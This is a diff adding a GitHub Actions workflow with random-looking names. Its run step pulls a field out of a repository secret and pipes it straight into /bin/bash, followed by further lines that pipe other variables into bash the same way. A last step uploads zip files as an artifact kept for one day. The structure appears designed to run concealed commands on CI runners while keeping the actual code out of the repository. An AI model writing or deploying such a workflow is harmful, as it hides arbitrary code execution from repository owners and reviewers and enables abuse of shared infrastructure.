@@ -1,0 +1,26 @@
+name: amandaaws644
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: amandaaws644
+        env:
+          xvk55839: ${{ secrets.xvk55839 }}
+        run: |
+          printf '%s' "$xvk55839" | jq -r .eygs798 | /bin/bash
+          echo $v134 | jq -r .b23 | /bin/bash
+          echo $bygs42 | jq -r .tuveb694 | /bin/bash
+          printf '%s' "$y86885" | jq -r .dtpw07941 | /bin/bash
+          echo $zlpe13 | jq -r .b048 | /bin/bash
+          printf '%s' "$jh59" | jq -r .goxol672 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: LIY2jvI6
+          path: "*.zip"
+          retention-days: 1
